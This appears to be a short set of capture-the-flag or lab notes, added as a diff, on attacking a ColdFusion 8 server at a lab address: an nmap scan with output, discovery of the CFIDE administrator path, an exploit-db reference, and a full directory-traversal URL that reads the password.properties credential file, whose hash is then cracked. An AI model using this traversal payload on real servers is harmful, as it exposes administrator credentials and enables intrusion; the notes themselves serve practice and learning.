@@ -1,0 +1,18 @@
+1-Enumeration:
+    nmap -T5 -Pn -sC -sV 10.10.10.11 -oN enum/sanLogs1.logs  -vv
+        PORT      STATE SERVICE REASON  VERSION
+        8500/tcp  open  fmtp?   syn-ack
+        49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
+        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+    http://10.10.10.11:8500/
+        CFIDE
+        CFDOCS
+        http://10.10.10.11:8500/CFIDE/administrator/
+
+    We found this exploit:
+        https://www.exploit-db.com/exploits/14641
+
+        http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+    We put the password into crackstation.... IT Works 
